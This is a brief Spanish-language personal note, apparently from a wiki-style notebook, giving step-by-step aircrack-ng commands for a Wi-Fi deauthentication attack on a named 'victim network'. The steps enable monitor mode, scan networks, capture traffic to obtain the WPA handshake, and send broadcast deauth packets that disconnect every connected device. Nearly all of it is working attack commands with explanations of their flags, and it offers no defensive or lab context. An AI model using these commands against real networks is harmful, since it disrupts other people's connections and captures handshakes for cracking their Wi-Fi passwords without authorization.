Esto lo que hace es des autentificar a cualquiera que se encuentre en la red victima

	airmon-ng wlan1 start
Iniciar la tarjeta de red en modo monitor

	airodump-ng wlan1mon
Escanear las redes disponibles
DOB66F5A4CBF

	airodump-ng -w CapturaDeAuthGlobal --essid INFINITUM33B5 wlan1mon
Con esto lo que se hace es capturar todo el trafico que pasa por la red y guardarlo en un archivo, aquí es donde se capturara el [[HandShake]]

	aireplay-ng -0 10 -e INFINITUM33B5 -c FF:FF:FF:FF:FF:FF wlan1mon
Esto manda 10 paquetes de des autentificación a todos los dispositivos conectados al essid proporcionado por medio del [[Broadcast]]
- 0 *especificamos que es un ataque DeAuth*
- 10 *la cantidad de paquetes de dese autentificación enviados*
- e *essid de la red victima*
- c *broadcast* (Este parámetro se puede omitir, ya que Air lo incluye)

Después de esto los dispositivos serán desconectados y reconectados a las red automáticamente, para esto nuestra tarjeta de red habrá capturado el [[HandShake]].